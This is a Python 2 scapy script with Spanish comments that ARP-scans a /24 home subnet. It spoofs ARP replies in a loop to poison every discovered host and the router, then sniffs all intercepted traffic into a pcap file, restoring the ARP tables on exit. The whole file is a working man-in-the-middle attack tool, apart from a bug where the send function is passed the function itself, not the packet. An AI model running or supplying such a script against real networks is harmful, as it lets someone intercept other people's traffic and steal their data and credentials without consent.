#!/usr/bin/python
## -*- coding: utf-8 -*-

from scapy.all import *
import sys, time, threading


def peticionARP(ipDestino, macDestino, ipOrigen, macOrigen):
    peticion = Ether(dst=macDestino)/ARP(pdst=ipDestino, psrc=ipOrigen,\
                hwsrc=macOrigen, op='who-has')
    sendp(peticionARP)


def envenenamiento(ipsRed, macsRed, ipRouter, macRouter, macPropia):
    try:
        while True:
            for i in range(0, len(ipsRed)):
                peticionARP(ipsRed[i], macsRed[i], ipRouter, macPropia)
                peticionARP(ipRouter, macRouter, ipsRed[i], macPropia)
                time.sleep(5)
    except:
        for j in range(2):
            for i in range(0, len(ipsRed)):
                peticionARP(ipsRed[i], macsRed[i], ipRouter, macRouter)
                peticionARP(ipRouter, macRouter, ipsRed[i], macsRed[i])    
        print "Finalizando envenenamiento"


def main():
    conf.verb = 0
    ipRouter = '192.168.1.1'
    redesIP = '192.168.1.0/24'
    conf.iface = 'wlp3s0'

    print "[++]Obtener MAC del router"
    router_ = srp1(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ipRouter),\
                retry=-2, timeout=2)

    if router_ is None:
        print "[++]El router "+str(ipRouter)+" no responde."
        sys.exit(1)

    macRouter = router_[ARP].hwsrc
    ipPropia = router_[ARP].pdst
    macPropia = router_[ARP].hwdst

    print "[++]Obtener direcciones MAC de los dispositivos activos en la red"
    respuestasRed, sinRespuestasRed = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/\
                        ARP(pdst=redesIP), retry=-2,\
                        timeout=2)
    ipsRed = []
    macsRed = []

    for estimulo,respuesta_ in respuestasRed:
        if(respuesta_[ARP].psrc != ipRouter):
            ipsRed.append(respuesta_[ARP].psrc)
            macsRed.append(respuesta_[ARP].hwsrc)

    if len(ipsRed) == 0:
        print "[++]No se detectaron dispositivos"
        sys.exit(1)
    else:
        print "[++]Se encontraron "+str(len(ipsRed))+" dispositivos en la red\n"

    print "[++]ROUTER: IP = "+str(ipRouter)+" MAC = "+str(macRouter)+"\n"
    for i in xrange(0, len(ipsRed)):
        print "[++]Dispositivo: IP = "+str(ipsRed[i])+" MAC = "+str(macsRed[i])


    t = threading.Thread(target=envenenamiento, args=(ipsRed, macsRed, ipRouter, macRouter, macPropia))
    t.start()

    try:
        print "\n[++]Capturando datos en _capturas_.pcap"
        paquetes = sniff(iface=conf.iface)
        wrpcap("_capturas_.pcap", paquetes)
    except KeyboardInterrupt:
        pass


main()

#Ctrl + C
#Ctrl + Z
